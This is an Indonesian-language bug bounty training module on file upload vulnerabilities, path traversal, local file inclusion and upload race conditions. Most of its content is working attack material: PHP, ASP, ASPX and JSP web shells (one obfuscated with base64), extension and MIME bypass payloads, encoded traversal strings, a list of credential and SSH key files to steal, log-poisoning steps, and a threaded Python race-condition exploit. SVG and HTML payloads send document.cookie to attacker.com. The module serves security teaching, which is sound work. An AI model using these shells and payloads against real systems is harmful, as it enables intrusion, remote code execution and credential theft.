# Sesi 12 — File Upload Vulnerabilities & Path Traversal

> **Level:** Intermediate  
> **Durasi Estimasi:** 5–6 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP Fundamentals), Sesi 04 (Recon), Sesi 08 (XSS)  
> **Tools:** Burp Suite, ffuf, ExifTool, Browser DevTools

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Mengidentifikasi dan bypass validasi file upload (ekstensi, MIME type, magic bytes)
- Mengeksploitasi file upload untuk XSS, RCE, dan server-side execution
- Melakukan Path Traversal / Directory Traversal di parameter file
- Menemukan LFI (Local File Inclusion) dan memahami implikasinya
- Mengidentifikasi Race Condition dalam proses upload
- Menulis laporan file upload bugs dengan PoC yang tepat

---

## 📚 Bagian 1 — Attack Surface File Upload

### 1.1 Mengapa File Upload Sering Rentan?

```
Validasi yang benar memerlukan CHECK bertingkat:
1. Client-side validation   → mudah bypass via Burp
2. Ekstensi file            → rename: shell.php → shell.php.jpg
3. MIME type di header      → ubah Content-Type di Burp
4. Magic bytes / file sig   → prepend valid signature ke file
5. Antivirus scan           → encoding, obfuscation
6. Path traversal           → ubah filename: ../../evil.php
7. Eksekusi di server       → bergantung server config

Jika SALAH SATU check lemah → potential vulnerability
```

### 1.2 Peta Attack Surface

```
Upload Attack Surface:
┌─────────────────────────────────────────────────────┐
│ IMPACT                    │ VULNERABILITY TYPE        │
├─────────────────────────────────────────────────────┤
│ Remote Code Execution     │ Web shell upload (.php)   │
│ Server-Side XSS           │ SVG/HTML upload           │
│ Client-Side XSS           │ HTML upload, SVG onload   │
│ Path Traversal / Overwrite│ ../../../etc/passwd        │
│ DoS                       │ ZIP bomb, billion laughs  │
│ SSRF                      │ URL-based "upload"        │
│ Information Disclosure    │ EXIF metadata             │
│ XXE                       │ SVG/XML upload            │
└─────────────────────────────────────────────────────┘
```

---

## 📚 Bagian 2 — Bypass Validasi File Upload

### 2.1 Bypass Client-Side Validation

```
Validation di JavaScript = tidak ada artinya dari security perspective.
Cara bypass:

Method 1: Matikan JavaScript di browser
Method 2: Intercept dengan Burp setelah browser kirim request
Method 3: Kirim langsung via Burp Repeater (bypass browser sama sekali)
```

### 2.2 Bypass Ekstensi File

```bash
# Coba variasi ekstensi yang bisa di-execute di server

# PHP variants
.php, .php3, .php4, .php5, .php7, .phtml, .phar
.PHP (case), .PhP, .php%00.jpg (null byte - legacy)

# ASP/ASPX variants
.asp, .aspx, .asa, .cer, .shtml

# JSP variants
.jsp, .jspx, .jsw, .jsv, .jspf

# Bypass daftar blacklist dengan variasi
.php.jpg          → Apache dengan mod_mime mungkin eksekusi sebagai PHP
.php%20           → trailing space (Windows path issue)
.php::$DATA       → Windows Alternate Data Stream
.pHp5             → case variation

# Double extension bypass
shell.php.jpg     → jika server eksekusi berdasarkan ekstensi pertama
shell.jpg.php     → jika server eksekusi berdasarkan ekstensi terakhir
```

### 2.3 Bypass MIME Type Validation

```http
# Normal upload PNG
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="photo.png"
Content-Type: image/png

[binary PNG data]

# Bypass: ubah Content-Type ke image/jpeg atau image/png
# tapi isi file adalah PHP shell
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png    ← ubah MIME type ke yang diizinkan

<?php system($_GET['cmd']); ?>
```

### 2.4 Bypass Magic Bytes (File Signature)

```python
# File signature (magic bytes) di awal file menentukan tipe file
# GIF: 47 49 46 38 (GIF89a)
# PNG: 89 50 4E 47 0D 0A 1A 0A (\x89PNG)
# JPEG: FF D8 FF
# PDF: 25 50 44 46 (%PDF)

# Buat file PHP dengan magic bytes GIF di awal
# File ini akan lulus validasi magic bytes tapi tetap executable sebagai PHP

cat > shell.php << 'EOF'
GIF89a;
<?php system($_GET['cmd']); ?>
EOF

# Atau dengan Python
with open('shell.php', 'wb') as f:
    f.write(b'GIF89a')           # magic bytes GIF
    f.write(b'\n<?php system($_GET["cmd"]); ?>')
```

### 2.5 Bypass via Content-Disposition Filename

```http
# Nama file dengan path traversal dalam filename
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"

# Double extension di MIME type check
Content-Disposition: form-data; name="file"; filename="shell.php;.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"

# Unicode normalization bypass
Content-Disposition: form-data; name="file"; filename="shell.php\u0000.jpg"
```

---

## 📚 Bagian 3 — Web Shell dan Remote Code Execution

### 3.1 Web Shell PHP Minimalis (untuk PoC)

```php
<?php
// Simple command execution shell - untuk PoC bug bounty saja
// JANGAN deploy di production atau sistem tanpa izin!
if(isset($_GET['cmd'])) {
    echo "<pre>" . htmlspecialchars(shell_exec($_GET['cmd'])) . "</pre>";
}
?>
```

### 3.2 Web Shell PHP Compact (Bypass Filter Sederhana)

```php
<?php system($_GET[0]); ?>

// Lebih compact lagi
<?=`$_GET[0]`?>

// Eval-based (bypass keyword filter)
<?php @eval($_POST['x']); ?>

// Obfuscated (bypass string detection)
<?php $f=base64_decode('c3lzdGVt'); $f($_GET['c']); ?>
// base64 decode 'c3lzdGVt' = 'system'
```

### 3.3 Non-PHP Web Shells

```asp
<!-- ASP web shell -->
<% eval request("cmd") %>

<!-- ASPX web shell -->
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.Process() {
    StartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request["cmd"]) {
        RedirectStandardOutput = true, UseShellExecute = false
    }
}.Start() ? ... : ""); %>

<!-- JSP web shell -->
<% Runtime rt = Runtime.getRuntime();
   String[] commands = {"bash", "-c", request.getParameter("cmd")};
   Process proc = rt.exec(commands);
   ... %>
```

### 3.4 XSS via File Upload (Lebih Common di Bug Bounty)

```html
<!-- SVG file dengan XSS payload -->
<!-- Simpan sebagai: xss.svg -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" 
     xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(255,255,255)"/>
  <script type="text/javascript">
    alert('XSS via SVG Upload on: ' + document.domain);
  </script>
</svg>

<!-- Upload SVG → server simpan → access URL langsung → XSS! -->
<!-- Impact lebih tinggi jika file diakses pada origin yang sama -->
```

```html
<!-- HTML file upload - jika server serve file HTML langsung -->
<!-- xss.html -->
<!DOCTYPE html>
<html>
<body onload="
  fetch('https://attacker.com/steal?c='+document.cookie);
  alert('XSS from uploaded file on: '+document.domain)
">
<h1>Innocent File</h1>
</body>
</html>
```

---

## 📚 Bagian 4 — Path Traversal / Directory Traversal

### 4.1 Konsep Path Traversal

```
Terjadi ketika aplikasi menggunakan input user sebagai bagian dari path file
tanpa sanitasi, memungkinkan akses ke file di luar direktori yang diizinkan.

Normal:
/api/file?name=report.pdf → /var/app/files/report.pdf

Path Traversal:
/api/file?name=../../../etc/passwd → /etc/passwd
```

### 4.2 Payload Path Traversal

```bash
# Basic
../../../etc/passwd
..\..\..\windows\win.ini    # Windows

# URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Double URL encoded (bypass WAF yang decode sekali)
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode / UTF-8 encoding
..%c0%af../etc/passwd       # overlong UTF-8 encoding untuk /
..%ef%bc%8f../etc/passwd    # full-width slash

# Null byte (untuk bypass ekstensi yang ditambahkan)
../../../etc/passwd%00.pdf  # legacy PHP/C apps

# Bypass filter yang hapus "../"
....//....//....//etc/passwd   # jika filter naif
..././..././..././etc/passwd   # variasi lain

# Absolute path
/etc/passwd
/etc/shadow
C:\windows\win.ini
```

### 4.3 File Target yang Bernilai

```bash
# Linux/Unix
/etc/passwd         → username system
/etc/shadow         → password hashes (jika readable)
/etc/hosts          → internal hostnames
/etc/nginx/nginx.conf   → web server config
/etc/apache2/sites-enabled/*
/var/www/html/.env  → environment variables, credentials
/proc/self/environ  → environment variables of process
/proc/self/cmdline  → command line arguments
/home/user/.ssh/id_rsa  → private SSH key!
/var/log/nginx/access.log  → access logs
/app/config/database.yml   → database credentials
/app/.env              → app secrets

# Windows
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config  → IIS config (credentials!)
C:\xampp\htdocs\.env
C:\Users\Administrator\.ssh\id_rsa
```

### 4.4 Path Traversal di Parameter Berbeda

```http
# Di query parameter
GET /download?file=../../etc/passwd HTTP/1.1
GET /view?path=../config/database.yml HTTP/1.1
GET /include?page=../../../etc/passwd HTTP/1.1

# Di header
GET /api/static HTTP/1.1
X-File-Path: ../../../etc/passwd

# Di JSON body
POST /api/read HTTP/1.1
{"filename": "../../../etc/passwd"}

# Di cookie
Cookie: template=../../../../etc/passwd

# Di multipart filename
Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
```

---

## 📚 Bagian 5 — Local File Inclusion (LFI)

### 5.1 LFI vs Path Traversal

```
PATH TRAVERSAL:
Baca file arbitrary dari filesystem
/api/download?file=../../etc/passwd → mengembalikan isi file

LOCAL FILE INCLUSION (LFI):
File di-include/execute oleh aplikasi (PHP include/require)
/page.php?template=../../etc/passwd → file di-INCLUDE, bukan hanya dibaca
Jika mengandung PHP code → code dieksekusi!
```

### 5.2 Exploitation LFI

```php
// Kode PHP rentan
<?php
$page = $_GET['page'];
include("pages/" . $page . ".php");
// → /pages/home.php, /pages/about.php

// Attack: bypass .php extension dengan null byte (PHP < 5.4)
?page=../../../etc/passwd%00
// → include("pages/../../../etc/passwd\0.php") → null byte memotong path

// PHP Wrappers untuk LFI
?page=php://filter/convert.base64-encode/resource=config
// → encode dan tampilkan file config.php sebagai base64

?page=php://input   // dengan POST body berisi PHP code
// POST body: <?php system('id'); ?>
```

### 5.3 LFI ke RCE via Log Poisoning

```bash
# Step 1: Cek apakah log file bisa diakses via LFI
GET /page?file=../../../var/log/nginx/access.log

# Step 2: Inject PHP code ke User-Agent (akan masuk ke log)
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# Step 3: Include log file via LFI → PHP code dieksekusi!
GET /page?file=../../../var/log/nginx/access.log&cmd=id

# Response dari log:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# (hasil command id disisipkan di antara log entries)
```

---

## 📚 Bagian 6 — Race Condition dalam File Upload

### 6.1 Upload Race Condition

```
Beberapa aplikasi:
1. Terima file upload
2. Simpan ke disk sementara (/tmp/upload/file.php)
3. Lakukan validasi (scan, type check)
4. Jika valid → pindah ke direktori final
5. Jika tidak valid → hapus file

Window of opportunity:
Antara step 2 dan step 5, file sementara sudah bisa diakses!

Attack:
Thread 1: Upload shell.php terus-menerus
Thread 2: Request ke /tmp/upload/shell.php terus-menerus
→ Jika Thread 2 berhasil request saat Thread 1 baru upload → RCE!
```

```python
# Script race condition untuk file upload
import threading
import requests

TARGET = "https://target.com"
UPLOAD_URL = f"{TARGET}/api/upload"
WEBSHELL_URL = f"{TARGET}/tmp/shell.php"
TOKEN = "your_auth_token"

shell_content = b"<?php system($_GET['cmd']); ?>"
files = {'file': ('shell.php', shell_content, 'image/jpeg')}
headers = {'Authorization': f'Bearer {TOKEN}'}

result = {'found': False}

def uploader():
    while not result['found']:
        requests.post(UPLOAD_URL, files=files, headers=headers)

def requester():
    while not result['found']:
        r = requests.get(f"{WEBSHELL_URL}?cmd=id", headers=headers)
        if 'uid=' in r.text:
            print(f"[!] RCE achieved! Response: {r.text[:200]}")
            result['found'] = True

# Jalankan paralel
threads = (
    [threading.Thread(target=uploader) for _ in range(5)] +
    [threading.Thread(target=requester) for _ in range(5)]
)
[t.start() for t in threads]
[t.join() for t in threads]
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — SVG Upload XSS di HackerOne Platform (Disclosed)

> **Platform:** HackerOne — HackerOne sendiri  
> **Referensi:** Pola dari disclosed H1 reports tentang SVG XSS  
> **Severity:** High (P2)

**Skenario:**
HackerOne mengizinkan upload foto profil. Peneliti menemukan bahwa file SVG diterima dan disajikan langsung dari domain hackerone.com. Karena SVG mendukung JavaScript, XSS via upload foto berhasil dieksploitasi.

```xml
<!-- profile.svg yang diupload -->
<svg xmlns="http://www.w3.org/2000/svg" onload="
  var img=new Image();
  img.src='https://attacker.com/h1steal?c='+document.cookie;
">
  <text>Photo</text>
</svg>
```

Saat siapapun mengunjungi profil attacker, SVG di-load → XSS berhasil → session H1 user bisa dicuri.

---

### Case 2 — Path Traversal di GitLab (CVE-2023-2825)

> **Source:** GitLab Security Advisory  
> **CVE:** CVE-2023-2825  
> **Severity:** Critical (CVSS 10.0)

**Detail:**
GitLab Community/Enterprise Edition memiliki Path Traversal vulnerability di fitur attachment. Unauthenticated user bisa membaca file arbitrary dari server GitLab melalui manipulasi parameter filename.

```http
# Request yang dieksploitasi
GET /uploads/-/system/user/avatar/1/../../../../../../etc/passwd HTTP/1.1
Host: gitlab.target.com

# Response mengandung isi /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Pelajaran:** Path traversal di file serving endpoint adalah bug yang sangat kritis, terutama ketika server menyimpan config files dan credentials.  
**Sumber:** [GitLab Security Release](https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/) (publik)

---

### Case 3 — File Upload RCE di WordPress Plugin (Common Pattern)

> **Referensi:** Pola umum dari WordPress vulnerability database — WordFence  
> **Severity:** Critical

**Skenario (terinspirasi dari pola umum):**
Plugin WordPress yang mengizinkan upload file media tidak memvalidasi ekstensi dengan benar. Server menggunakan Apache dengan mod_php.

```http
# Upload file dengan ekstensi ganda
POST /wp-admin/admin-ajax.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="image.php.jpg"
Content-Type: image/jpeg

GIF89a;
<?php system($_GET['cmd']); ?>
------boundary--

# Jika Apache dikonfigurasi dengan AddHandler php-script .php
# File "image.php.jpg" mungkin dieksekusi sebagai PHP!
# Access: /wp-content/uploads/image.php.jpg?cmd=whoami
```

---

### Case 4 — EXIF Metadata Path Traversal (Simulated — Common Pattern)

> **Tipe:** Path Traversal via Filename Metadata  
> **Inspirasi:** Pola dari beberapa bug bounty reports tentang filename manipulation  
> **Severity:** Medium–High

**Skenario:**
Aplikasi menggunakan nama file asli dari upload untuk menyimpan file tanpa sanitasi:

```python
# Kode backend yang rentan
import os
from flask import request

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    # BUG: tidak sanitasi filename!
    filepath = os.path.join('/var/www/uploads/', f.filename)
    f.save(filepath)
    return 'Uploaded: ' + filepath
```

**Exploit:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/backdoor.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------boundary--

# File disimpan di /var/www/html/backdoor.php!
# Accessible via: https://target.com/backdoor.php?cmd=id
```

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy (Gratis)
- 🔗 [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
- 🔗 [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
- 🔗 [Path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple-case)
- 🔗 [Path traversal with filter bypass](https://portswigger.net/web-security/file-path-traversal/lab-filter-bypass-tricks)
- 🔗 [All File Upload Labs](https://portswigger.net/web-security/file-upload)

### Lab 2 — TryHackMe
- 🔗 [File Inclusion](https://tryhackme.com/room/fileinc)
- 🔗 [Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns)

### Lab 3 — HackTheBox Academy
- 🔗 [File Upload Attacks Module](https://academy.hackthebox.com/module/details/136)
- 🔗 [File Inclusion Module](https://academy.hackthebox.com/module/details/23)

### Lab 4 — DVWA
```bash
docker run -p 80:80 vulnerables/web-dvwa
# Modul: File Upload, File Inclusion
```

---

## 📋 File Upload & Path Traversal Checklist

```markdown
## File Upload Checklist

### Bypass Tests
- [ ] Client-side only → bypass via Burp
- [ ] Ekstensi ganda: shell.php.jpg, shell.jpg.php
- [ ] Case variation: shell.PHP, shell.PhP
- [ ] Content-Type: ubah ke image/jpeg tapi isi PHP
- [ ] Magic bytes: prepend GIF89a ke PHP shell
- [ ] Null byte: shell.php%00.jpg (PHP < 5.4)
- [ ] Filename path traversal: ../../../webroot/shell.php

### Impact Tests
- [ ] Apakah file di-serve dari domain yang sama? → XSS possible
- [ ] Apakah file PHP bisa dieksekusi? → RCE possible
- [ ] SVG upload diizinkan? → XSS via onload
- [ ] HTML upload diizinkan? → XSS

## Path Traversal Checklist

### Detection
- [ ] Parameter yang berisi nama file
- [ ] Parameter seperti: path, file, dir, page, template, name
- [ ] Test dengan: ../../../etc/passwd
- [ ] Test encoding variations

### Target Files
- [ ] /etc/passwd (Linux)
- [ ] /etc/hosts
- [ ] .env file
- [ ] config/database files
- [ ] SSH private keys
- [ ] Web server configs
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| PortSwigger | [File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload) | Complete guide |
| PortSwigger | [Path Traversal](https://portswigger.net/web-security/file-path-traversal) | Traversal techniques |
| OWASP | [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) | Defense & testing |
| HackTricks | [File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload) | Bypass techniques |
| PayloadsAllTheThings | [File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) | Payload collections |

---

## 🔑 Key Takeaways

1. **Multi-layer bypass diperlukan** — validasi bertingkat perlu dibypass satu per satu
2. **SVG dan HTML upload = XSS** — sering lebih mudah direport daripada RCE
3. **Path traversal di filename** — sering terlewat karena developer fokus pada ekstensi
4. **Magic bytes bypass** — prepend GIF89a membuat file lulus content validation
5. **Race condition upload** — window kecil tapi cukup untuk RCE jika timing tepat

---

*Sesi berikutnya: **Sesi 14 — XXE & OS Command Injection***
